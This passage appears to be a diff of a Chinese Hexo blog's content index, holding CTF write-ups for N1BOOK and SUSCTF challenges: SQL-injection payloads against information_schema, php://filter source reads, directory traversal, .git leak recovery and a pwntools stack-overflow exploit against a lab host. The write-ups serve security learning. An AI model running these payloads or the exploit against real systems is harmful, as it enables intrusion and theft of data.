@@ -11,35 +11,43 @@
 <li>还有<code>filename.bak</code>文件</li>
 </ol>
 <h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol>
-<li>地址后加<code>/index.php~</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109223222659-122979701.png">  </li>
-<li><code>/.index.php.swp</code>会即刻下载备份文件，可通过<code>vi index.php</code>建一个只有空格的文件，然后通过<code>vim -r index.php</code>进行恢复即可得到<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109225055125-364536216.png">  </li>
-<li><code>/robots.txt</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109224118439-1125637828.png"><br>查看这个文本文件<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109224223273-908316035.png"><br>综上可得  </li>
+<li>地址后加<code>/index.php~</code>    </li>
 </ol>
+<p>  <img src="/2020/11/11/N1BOOK/1931211-20201109223222659-122979701.png" alt="img"></p>
+<ol start="2">
+<li><p><code>/.index.php.swp</code>会即刻下载备份文件，可通过<code>vi index.php</code>建一个只有空格的文件，然后通过<code>vim -r index.php</code>进行恢复即可得到<br> <img src="/2020/11/11/N1BOOK/1931211-20201109225055125-364536216.png" alt="img"></p>
+</li>
+<li><p><code>/robots.txt</code><br> <img src="/2020/11/11/N1BOOK/1931211-20201109224118439-1125637828.png" alt="img"><br> 查看这个文本文件  </p>
+</li>
+</ol>
+<p>  <img src="/2020/11/11/N1BOOK/1931211-20201109224223273-908316035.png" alt="img"></p>
+<p>  综上可得  </p>
 <blockquote>
 <p>n1book{info_1s_v3ry_imp0rtant_hack}</p>
 </blockquote>
-<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109172615955-1966111900.png">  </p>
+<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露 </p>
+<p><img src="/2020/11/11/N1BOOK/1931211-20201109172615955-1966111900.png" alt="img"></p>
 <h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol>
 <li>借助<a href="https://github.com/WangYihang/GitHacker">GitHacker工具</a>  </li>
 <li><code>git clone https://github.com/WangYihang/GitHacker.git</code>  </li>
 <li><code>cd GitHacker</code>  </li>
-<li><code>python Githacker.py http://0fcbe3ec-471a-452a-9e5f-953c5026eb18.node3.buuoj.cn/.git</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109222425300-439745981.png">  </li>
-<li>进入恢复后的文件夹<code>cd 0fcbe3ec-471a-452a-9e5f-953c5026eb18_node3_buuoj_cn_</code>，有个index.html<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109222705671-1100399964.png">  </li>
-<li>浏览器打开index.html即可拿到flag<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109222803648-1320351443.png">  <blockquote>
+<li><code>python Githacker.py http://0fcbe3ec-471a-452a-9e5f-953c5026eb18.node3.buuoj.cn/.git</code><br><img src="/2020/11/11/N1BOOK/1931211-20201109222425300-439745981.png" alt="img">  </li>
+<li>进入恢复后的文件夹<code>cd 0fcbe3ec-471a-452a-9e5f-953c5026eb18_node3_buuoj_cn_</code>，有个index.html<br><img src="/2020/11/11/N1BOOK/1931211-20201109222705671-1100399964.png" alt="img">  </li>
+<li>浏览器打开index.html即可拿到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201109222803648-1320351443.png" alt="img"><blockquote>
 <p>n1book{git_looks_s0_easyfun}</p>
 </blockquote>
 </li>
 </ol>
 <h2 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h2><ol>
-<li>打开题目链接可以看到<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111105652234-783984521.png">  </li>
-<li>试试<code>id=1+1</code>的回显，发现和<code>id=1</code>结果相同，所以不是数字型注入，可能是字符型<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111110017446-1664980143.png">  </li>
-<li>尝试<code>id=1a</code>发现和<code>id=1</code>结果相同，所以确实是字符型<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111110249600-1227706058.png">  </li>
-<li>尝试用<code>id=1&#39;#</code>，单引号用于闭合前面的单引号，井号用于注释后面预置的单引号。这里<font face="楷体" color="red">注意：#一定要用URL编码，即%23</font>，所以实际上需要输入<code>id=1&#39;%23</code>单引号会被自动转成%27<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111111203589-1163518685.png">  </li>
+<li>打开题目链接可以看到<br><img src="/2020/11/11/N1BOOK/1931211-20201111105652234-783984521.png" alt="img"></li>
+<li>试试<code>id=1+1</code>的回显，发现和<code>id=1</code>结果相同，所以不是数字型注入，可能是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110017446-1664980143.png" alt="img"></li>
+<li>尝试<code>id=1a</code>发现和<code>id=1</code>结果相同，所以确实是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110249600-1227706058.png" alt="img"></li>
+<li>尝试用<code>id=1&#39;#</code>，单引号用于闭合前面的单引号，井号用于注释后面预置的单引号。这里<font face="楷体" color="red">注意：#一定要用URL编码，即%23</font>，所以实际上需要输入<code>id=1&#39;%23</code>单引号会被自动转成%27<br><img src="/2020/11/11/N1BOOK/1931211-20201111111203589-1163518685.png" alt="img"></li>
 <li>可以成功显示  </li>
-<li>优先尝试UNION注入<code>id=-1&#39;union select 1,2,3%23</code>，其中-1是为了使第一行记录无法被查询到，当然，除了-1也可以是一个很大的值比如1024、100等。后面的查询语句是尝试测试哪些字段可以回显<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">参考</a><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111112032432-1319004183.png">  </li>
-<li>所以将数字2改成我们想查询的内容：所有表名<code>group_concat(table_name)</code>，<code>group_concat</code>是用<code>,</code>联合多行记录的函数。所以为查询本数据库的其他所有表名，需<code>id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code>，随即看到fl4g<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111112630199-158278303.png">  </li>
-<li>查询fl4g中的字段名，<code>id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;%23</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111113011837-1925798496.png">  </li>
-<li>获取fllllag的内容，<code>id=-1&#39;union select 1,fllllag,3 from fl4g%23</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111113143857-1970053562.png">  <blockquote>
+<li>优先尝试UNION注入<code>id=-1&#39;union select 1,2,3%23</code>，其中-1是为了使第一行记录无法被查询到，当然，除了-1也可以是一个很大的值比如1024、100等。后面的查询语句是尝试测试哪些字段可以回显<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">参考</a><br><img src="/2020/11/11/N1BOOK/1931211-20201111112032432-1319004183.png" alt="img"></li>
+<li>所以将数字2改成我们想查询的内容：所有表名<code>group_concat(table_name)</code>，<code>group_concat</code>是用<code>,</code>联合多行记录的函数。所以为查询本数据库的其他所有表名，需<code>id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code>，随即看到fl4g<br><img src="/2020/11/11/N1BOOK/1931211-20201111112630199-158278303.png" alt="img"></li>
+<li>查询fl4g中的字段名，<code>id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113011837-1925798496.png" alt="img"></li>
+<li>获取fllllag的内容，<code>id=-1&#39;union select 1,fllllag,3 from fl4g%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113143857-1970053562.png" alt="img"><blockquote>
 <p>n1book{union_select_is_so_cool}</p>
 </blockquote>
 </li>
@@ -50,17 +58,30 @@
 <li>dual用于测试数据库是否可以正常使用  </li>
 </ol>
 <h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><ol>
-<li>在连接后加上<code>/login.php</code>，右键查看源码<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201114180246608-43938250.png"><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201114175943865-1170585348.png">  </li>
-<li>回到登录页面，打开Burp Suite，安装方法<a href="https://www.pianshen.com/article/8533363563/#20_Burp_Suite__57">参考</a>  </li>
-<li>推荐浏览器插件：SwitchyOmega，可以省去每次设置代理的步骤，使用BurpSuite时，点击插件选择对应Burp Suite的代理即可<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122233423320-7334493.png">  </li>
-<li>在login界面随便输入用户名和密码如1,1然后点击登录  </li>
-<li>可以在Burp Suite中Proxy-&gt;HTTP history看到记录<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122234140730-1675769603.png">  </li>
-<li>CTRL+R，发送到Repeater，在login.php后添加<code>?tips=1</code>，点击Go，看到报错<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122234308612-2127113186.png">  </li>
-<li>用dual进行测试<code>name=1&#39;and updatexml(1,concat(0x7e,(select 1 from dual)),1)#&amp;pass=xxxx</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122235414244-1226071747.png">  </li>
-<li>说明存在过滤，将select改成selEct重新发送后回显正常<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122235551248-284421726.png">  </li>
-<li>之后的操作与与SQL注入1同理，将selEct后的1改为group_concat(table_name)，dual改为information_schema.tables where table_schema=database()以查看所有表名<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122235936482-283322537.png">  </li>
-<li>仍与SQL注入1同理，查看fl4g的字段，分别改为group_concat(column_name)和information_schema.columns where table_name=’fl4g’<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201123000206027-1673938152.png">  </li>
-<li>获取flag，<code>selEct flag from fl4g</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201123000312454-163132210.png">  <blockquote>
+<li>在连接后加上<code>/login.php</code>，右键查看源码<br><img src="/2020/11/11/N1BOOK/1931211-20201114180246608-43938250.png" alt="img"></li>
+</ol>
+<p>  <img src="/2020/11/11/N1BOOK/1931211-20201114175943865-1170585348.png" alt="img">  </p>
+<ol start="2">
+<li><p>回到登录页面，打开Burp Suite，安装方法<a href="https://www.pianshen.com/article/8533363563/#20_Burp_Suite__57">参考</a>  </p>
+</li>
+<li><p>推荐浏览器插件：SwitchyOmega，可以省去每次设置代理的步骤，使用BurpSuite时，点击插件选择对应Burp Suite的代理即可<br><img src="/2020/11/11/N1BOOK/1931211-20201122233423320-7334493.png" alt="img">  </p>
+</li>
+<li><p>在login界面随便输入用户名和密码如1,1然后点击登录  </p>
+</li>
+<li><p>可以在Burp Suite中Proxy-&gt;HTTP history看到记录<br><img src="/2020/11/11/N1BOOK/1931211-20201122234140730-1675769603.png" alt="img">  </p>
+</li>
+<li><p>CTRL+R，发送到Repeater，在login.php后添加<code>?tips=1</code>，点击Go，看到报错<br><img src="/2020/11/11/N1BOOK/1931211-20201122234308612-2127113186.png" alt="img">  </p>
+</li>
+<li><p>用dual进行测试<code>name=1&#39;and updatexml(1,concat(0x7e,(select 1 from dual)),1)#&amp;pass=xxxx</code><br><img src="/2020/11/11/N1BOOK/1931211-20201122235414244-1226071747.png" alt="img">  </p>
+</li>
+<li><p>说明存在过滤，将select改成selEct重新发送后回显正常<br><img src="/2020/11/11/N1BOOK/1931211-20201122235551248-284421726.png" alt="img">  </p>
+</li>
+<li><p>之后的操作与与SQL注入1同理，将selEct后的1改为group_concat(table_name)，dual改为information_schema.tables where table_schema=database()以查看所有表名<br><img src="/2020/11/11/N1BOOK/1931211-20201122235936482-283322537.png" alt="img">  </p>
+</li>
+<li><p>仍与SQL注入1同理，查看fl4g的字段，分别改为group_concat(column_name)和information_schema.columns where table_name=’fl4g’<br><img src="/2020/11/11/N1BOOK/1931211-20201123000206027-1673938152.png" alt="img">  </p>
+</li>
+<li><p>获取flag，<code>selEct flag from fl4g</code><br><img src="/2020/11/11/N1BOOK/1931211-20201123000312454-163132210.png" alt="img">  </p>
+<blockquote>
 <p>n1book{login_sqli_is_nice}</p>
 </blockquote>
 </li>
@@ -71,8 +92,8 @@
 <li>利用Filter机制，构造形如以上的攻击数据可以读取文件，拿到各种文件的源码  </li>
 </ol>
 <h3 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h3><ol>
-<li>点击题目链接<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115180608275-1525964878.png">  </li>
-<li><code>p=php://filter/read=convert.base64-encode/resource=hello</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115181019047-1546308797.png">  <blockquote>
+<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115180608275-1525964878.png" alt="img">  </li>
+<li><code>p=php://filter/read=convert.base64-encode/resource=hello</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181019047-1546308797.png" alt="img">  <blockquote>
 <p>PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</p>
 </blockquote>
 </li>
@@ -81,9 +102,9 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <ol start="3">
-<li><p>尝试改p，发现<code>p=flag</code>时有回显，所以应该存在这么个文件<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115180652404-1677628879.png">  </p>
+<li><p>尝试改p，发现<code>p=flag</code>时有回显，所以应该存在这么个文件<br><img src="/2020/11/11/N1BOOK/1931211-20201115180652404-1677628879.png" alt="img">  </p>
 </li>
-<li><p><code>p=php://filter/read=convert.base64-encode/resource=flag</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115181356049-426897552.png">  </p>
+<li><p><code>p=php://filter/read=convert.base64-encode/resource=flag</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181356049-426897552.png" alt="img">  </p>
 <blockquote>
 <p>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</p>
 </blockquote>
@@ -98,36 +119,43 @@
 
 <p>由于static后没有加/，如果用户请求/static../，拼接到alias进会变成/home/myapp/static/../会穿越到myapp目录  </p>
 <h3 id="方法-4"><a href="#方法-4" class="headerlink" title="方法"></a>方法</h3><ol>
-<li>点击题目链接<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235618945-1220381986.png">  </li>
-<li>右键查看源码<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235644275-1101729838.png">  </li>
-<li>查看img目录<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235800682-1951172374.png">  </li>
-<li>目录穿越<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235824630-1004736249.png">  </li>
+<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115235618945-1220381986.png" alt="img"> </li>
+<li>右键查看源码<br><img src="/2020/11/11/N1BOOK/1931211-20201115235644275-1101729838.png" alt="img">  </li>
+<li>查看img目录<br><img src="/2020/11/11/N1BOOK/1931211-20201115235800682-1951172374.png" alt="img">  </li>
+<li>目录穿越<br><img src="/2020/11/11/N1BOOK/1931211-20201115235824630-1004736249.png" alt="img">  </li>
 <li>下载flag，用记事本打开即可  <blockquote>
 <p>n1book{afr_2_solved}</p>
 </blockquote>
 </li>
 </ol>
-<h2 id="第五章-CTF之RE章-Hello-RE"><a href="#第五章-CTF之RE章-Hello-RE" class="headerlink" title="[第五章 CTF之RE章]Hello, RE"></a>[第五章 CTF之RE章]Hello, RE</h2><p>直接拖到ida64反编译即可看到flag<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111115333510-1380860265.png">  </p>
+<h2 id="第五章-CTF之RE章-Hello-RE"><a href="#第五章-CTF之RE章-Hello-RE" class="headerlink" title="[第五章 CTF之RE章]Hello, RE"></a>[第五章 CTF之RE章]Hello, RE</h2><p>直接拖到ida64反编译即可看到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201111115333510-1380860265.png" alt="img">  </p>
 <blockquote>
 <p>n1book{Welcome_to_reversing_world!}  </p>
 </blockquote>
 <h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><p>题目提供了libc-2.27.so和stack，根据经验知道这题环境是Ubuntu18，需要进行堆栈平衡  </p>
 <ol>
-<li><code>checksec stack</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204026170-317361439.png">  </li>
+<li><code>checksec stack</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111204026170-317361439.png" alt="img">  </li>
 <li>IDA64反编译，并查看<code>main</code>函数  </li>
 </ol>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ol start="3">
-<li>进一步查看<code>vuln</code>，发现栈溢出漏洞<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204429141-497488314.png">  </li>
-<li>双击变量<code>v1</code>查看栈信息，所以当覆盖<code>&#39;a&#39;*18</code>后即可到达函数返回地址<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204527280-1969476305.png">  </li>
-<li>同时注意到IDA64的函数窗口有个<code>shell</code>，查看以下发现<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204818419-1089495331.png">  </li>
-<li>所以需要将<code>shell</code>的地址0x覆盖到<code>vuln</code>的返回地址即可。由于前面提到需要堆栈平衡，我们还要知道shell的ret地址<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111205501285-1592593146.png"><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111205403033-1732093910.png">  </li>
+<li><p>进一步查看<code>vuln</code>，发现栈溢出漏洞<br><img src="/2020/11/11/N1BOOK/1931211-20201111204429141-497488314.png" alt="img">  </p>
+</li>
+<li><p>双击变量<code>v1</code>查看栈信息，所以当覆盖<code>&#39;a&#39;*18</code>后即可到达函数返回地址<br><img src="/2020/11/11/N1BOOK/1931211-20201111204527280-1969476305.png" alt="img">  </p>
+</li>
+<li><p>同时注意到IDA64的函数窗口有个<code>shell</code>，查看以下发现<br><img src="/2020/11/11/N1BOOK/1931211-20201111204818419-1089495331.png" alt="img"> </p>
+</li>
+<li><p>所以需要将<code>shell</code>的地址0x覆盖到<code>vuln</code>的返回地址即可。由于前面提到需要堆栈平衡，我们还要知道shell的ret地址<br><img src="/2020/11/11/N1BOOK/1931211-20201111205501285-1592593146.png" alt="img"></p>
+</li>
+</ol>
+<p>  <img src="/2020/11/11/N1BOOK/1931211-20201111205403033-1732093910.png" alt="img">  </p>
+<ol start="7">
 <li>综上，有exp如下  </li>
 </ol>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./stack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25413</span>)</span><br><span class="line">shell = <span class="number">0x400537</span></span><br><span class="line">retn = <span class="number">0x40054e</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">18</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()         </span><br></pre></td></tr></table></figure>
 
 <ol start="8">
-<li><code>python exp.py</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111205701121-1124011515.png">  <blockquote>
+<li><code>python exp.py</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111205701121-1124011515.png" alt="img">  <blockquote>
 <p>n1book{851939e4e90b864b8d20fe6228564522}</p>
 </blockquote>
 </li>
@@ -156,6 +184,9 @@
 <h3 id="菜单栏无法识别问题"><a href="#菜单栏无法识别问题" class="headerlink" title="菜单栏无法识别问题"></a>菜单栏无法识别问题</h3><p>类似 <code>Cannot GET /%20</code> 的问题，是因为主题的<code>_congif.yml</code> 文件中菜单栏的设置多个空格，官方默认的 <code>home: / || home</code>是错的，应该是 <code>home: /|| home</code></p>
 <h3 id="图片不显示的问题"><a href="#图片不显示的问题" class="headerlink" title="图片不显示的问题"></a>图片不显示的问题</h3><p><a href="https://www.cnblogs.com/gispathfinder/p/12239390.html">参考</a> ，这是 hexo-asset-image 的 bug，需要对<code>Blog\node_modules\hexo-asset-image\index.js</code>进行如下修改，即可正常显示</p>
 <p><img src="/2021/05/09/Ref/image-20210510174338088.png" alt="image-20210510174338088"></p>
+<h3 id="编译时遇到未知路径问题"><a href="#编译时遇到未知路径问题" class="headerlink" title="编译时遇到未知路径问题"></a>编译时遇到未知路径问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL &#123;</span><br><span class="line">  err: Template render error: (unknown path)</span><br><span class="line">    Error: unexpected end of comment</span><br><span class="line">      at Object._prettifyError (D:\Document\Blog\node_modules\nunjucks\src\lib.js:36:11)</span><br><span class="line">      at Template.render (D:\Document\Blog\node_modules\nunjucks\src\environment.js:538:21)</span><br><span class="line">      at Environment.renderString (D:\Document\Blog\node_modules\nunjucks\src\environment.js:380:17)</span><br><span class="line">      at D:\Document\Blog\node_modules\hexo\lib\extend\tag.js:236:16</span><br><span class="line">      at tryCatcher (D:\Document\Blog\node_modules\bluebird\js\release\util.js:16:23)</span><br><span class="line">      at Function.Promise.fromNode.Promise.fromCallback (D:\Document\Blog\node_modules\bluebird\js\release\promise.js:209:30)</span><br></pre></td></tr></table></figure>
+
+<p>这种是文章中出现未转义的括号造成的，尽量用 ` 进行转移，将其包裹成文本或代码形式</p>
 <h2 id="不同的修改"><a href="#不同的修改" class="headerlink" title="不同的修改"></a>不同的修改</h2><p>版本：从参考地址下载的最新版（NexT 8.4.0 Released）</p>
 <h3 id="圆形旋转头像"><a href="#圆形旋转头像" class="headerlink" title="圆形旋转头像"></a>圆形旋转头像</h3><p>打开<code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，将<code>rounded</code>和<code>rotated</code>都改成<code>true</code>即可</p>
 <p><img src="/2021/05/09/Ref/image-20210510101136415.png" alt="image-20210510101136415"></p>
@@ -176,6 +207,16 @@
       <tags>
         <tag>Ref</tag>
         <tag>Blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>imageTest</title>
+    <url>/2021/05/10/image/</url>
+    <content><![CDATA[<p>测试图片相对路径</p>
+<p><img src="/2021/05/10/image/test.png"></p>
+]]></content>
+      <tags>
+        <tag>Test</tag>
       </tags>
   </entry>
   <entry>
@@ -282,13 +323,214 @@
       </tags>
   </entry>
   <entry>
-    <title>imageTest</title>
-    <url>/2021/05/10/image/</url>
-    <content><![CDATA[<p>测试图片相对路径</p>
-<p><img src="/2021/05/10/image/test.png"></p>
+    <title>SUS2020</title>
+    <url>/2020/10/20/SUS2020/</url>
+    <content><![CDATA[<h4 id="分数-3287"><a href="#分数-3287" class="headerlink" title="分数 3287"></a>分数 3287</h4><h4 id="排名-15"><a href="#排名-15" class="headerlink" title="排名 15"></a>排名 15</h4><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="[Misc]签到"></a>[Misc]签到</h4><p>SUSCTF{Welcome_t0_SUSCTF}</p>
+<h4 id="Misc-爆破鬼才请求出战"><a href="#Misc-爆破鬼才请求出战" class="headerlink" title="[Misc]爆破鬼才请求出战"></a>[Misc]爆破鬼才请求出战</h4><h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li><p>打开会有提示<code>m?s?_?tt4?k!</code><br><img src="/2020/10/20/SUS2020/baopo.png">  </p>
+</li>
+<li><p>利用ARCHPR掩码攻击获取密码<br><img src="/2020/10/20/SUS2020/%E6%8E%A9%E7%A0%81%E6%94%BB%E5%87%BB.png"><br><code>m4sk_att4Ck!</code>  </p>
+</li>
+<li><p>解压得到LSB.png，利用StegSolve提取隐写数据，保存成文本，得到<br><code>S&#123;urgdt1&#125;UY_30__sS0a_04mc</code>  </p>
+</li>
+<li><p>栅栏密码，每组3字<br><code>SUS&#123;Y0u_ar3_g00d_4t_m1sc&#125;</code></p>
+</li>
+</ol>
+<h4 id="Misc-签到之公众号"><a href="#Misc-签到之公众号" class="headerlink" title="[Misc]签到之公众号"></a>[Misc]签到之公众号</h4><p>关注公众号，回复flag<br><code>SUSCTF&#123;W3lc0m3_t0_SUSCTF&#125;</code></p>
+<h4 id="Misc-Dance-Dance"><a href="#Misc-Dance-Dance" class="headerlink" title="[Misc]Dance_Dance"></a>[Misc]Dance_Dance</h4><h5 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li><p>图片<br><img src="/2020/10/20/SUS2020/The_dancing_men.png">  </p>
+</li>
+<li><p>利用<a href="https://www.dcode.fr/dancing-men-cipher%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">https://www.dcode.fr/dancing-men-cipher解密得到</a>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pa sswdL etU  </span><br><span class="line">sdanCe</span><br></pre></td></tr></table></figure></li>
+<li><p>根据提示“让我们跟着音乐起舞吧！”，使用<code>binwalk</code>查看是否内含文件，发现zip，故<code>dd if=The_dancing_men.png of=f.zip skip=48243 bs=1</code>将压缩包分离出来  </p>
+</li>
+<li><p>解压发现需要密码，正是<code>LetUsdanCe</code>  </p>
+</li>
+<li><p>得到音频文件Do_u_know_spectrum.wav，用Audacity打开，并查看频谱图有：<br><img src="/2020/10/20/SUS2020/spec.png">  </p>
+</li>
+<li><p>扫描二维码得<br><code>SUS&#123;1nt3r35t1nG_5p3ctRum&#125;</code></p>
+</li>
+</ol>
+<h4 id="Misc-balɟ¯ʇuᴉɹԀ"><a href="#Misc-balɟ¯ʇuᴉɹԀ" class="headerlink" title="[Misc]ƃɐlɟ¯ʇuᴉɹԀ"></a>[Misc]ƃɐlɟ¯ʇuᴉɹԀ</h4><h5 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
+<li>用010Editor查看发现尾部有类似zip文件头的标志，但整个字节流是倒序的，故利用Python顺过来  </li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\ti_nepo_ot_woh&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> m:</span><br><span class="line">    m.write(binascii.b2a_hex(f))</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(tmp[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\result.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> result:</span><br><span class="line">    result.write(binascii.a2b_hex(tmp[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>得到一个可以正常解压缩的zip文件result.zip，解压缩得到here_are_some_codes.zip和use_zipin_to_get_password.txt，后者中有以下文本  </p>
